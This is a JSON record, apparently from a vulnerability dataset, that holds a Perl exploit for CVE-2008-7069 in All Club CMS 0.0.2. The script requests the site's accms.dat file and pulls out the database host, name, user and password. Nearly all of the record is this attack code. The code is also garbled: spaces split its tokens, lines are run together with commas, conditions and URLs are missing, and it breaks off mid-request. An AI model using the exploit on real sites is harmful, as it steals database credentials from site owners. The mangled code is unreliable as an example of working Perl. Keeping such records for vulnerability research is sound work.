{
    "text": "vul_name : All Club CMS <= 0.0.2 Remote DB Config Retrieve Exploit ， vul_cve : CVE-2008-7069 ， vul_poc :  #  ! /usr/bin/perl ， =about ， All Club CMS <= 0.0.2 Remote DB Config Retrieve Exploit ， by athos - staker [ at ] hotmail [ dot ] it ， download on ， Usage : perl exploit.pl localhost/cms [ MODE ]  ， perl exploit.pl localhost/cms all ， perl exploit.pl localhost/cms default ， NOTE : Don't add me on MSN Messenger ， =cut ， use strict ;  ， use warnings ;  ， use IO : Socket ;  ， use LWP : UserAgent ;  ， my (  @ conf ,  $ result )  ;  ， my $ host = shift ;  ， my $ path = shift ;  ， my $ mode = shift or &usage ;  ， my @ data = split /=\\s/ , dbconfig (  )  ;  ， die \"Exploit Failed ! \\n\" unless ( join ( ' ,  @ data ) = ~ /DB_PASS/i )  ;  ， { ， my $ http = new LWP : UserAgent (  ， agent => 'Lynx ( textmode ) ' ,  ， timeout => 5 ,  ，  ) or die $  !  ;  ， my $ send = $ http->get ( \" ， { ， print STDOUT $ send->content ;  ， exit ;  ， } ， { ， print STDERR $ send->status_line ;  ， exit ;  ， } ， } ， { ，  $ data [ 9 ] = ~ s/\\s/\\0/ ;  # password ，  $ data [ 8 ] = ~ s/DB_PASS/\\0/ ;  # username ，  $ data [ 7 ] = ~ s/DB_USER/\\0/ ;  # db host ，  $ data [ 6 ] = ~ s/DB_HOST/\\0/ ;  # db name ，  $ data [ 5 ] = ~ s/DEF_DB/\\0/ ;  # db type ，  @ conf = (  ， 'dbhost : ' => $ data [ 7 ]  ,  ， 'dbname : ' => $ data [ 6 ]  ,  ， 'dbtype : ' => $ data [ 5 ]  ,  ， 'username : ' => $ data [ 8 ]  ,  ， 'password : ' => $ data [ 9 ]  ,  ，  )  ;  ， foreach (  @ conf )  ， { ，  $ result .= $ _ ;  ， } ， my $ content = join ' , split / / ,  $ result ;  ， { ， print STDOUT \" [ - ] Exploit Successfully ! \\n\" ;  ， print STDOUT $ content ;  ， exit ;  ， } ， { ， print STDOUT \" [ - ] Exploit Failed ! \\n\" ;  ， print STDOUT \" [ - ] by athos - staker [ at ] hotmail [ dot ] it\\n\" ;  ， exit ;  ， } ， } ， sub dbconfig ， { ， my $ html ;  ， my $ sock = new IO : Socket : INET (  ， PeerAddr => $ host ,  ， PeerPort => 80 ,  ， Proto => 'tcp' ,  ，  ) or die $  !  ;  ， my $ data = \"GET / $ path/accms.dat HTTP/1.1\\r\\n\". ， \"Host :  $ host\\r\\n\". ， \"User-Agent : Lynx ( textmode ) \\r\\n\".",
    "time": "2009.08.27"
}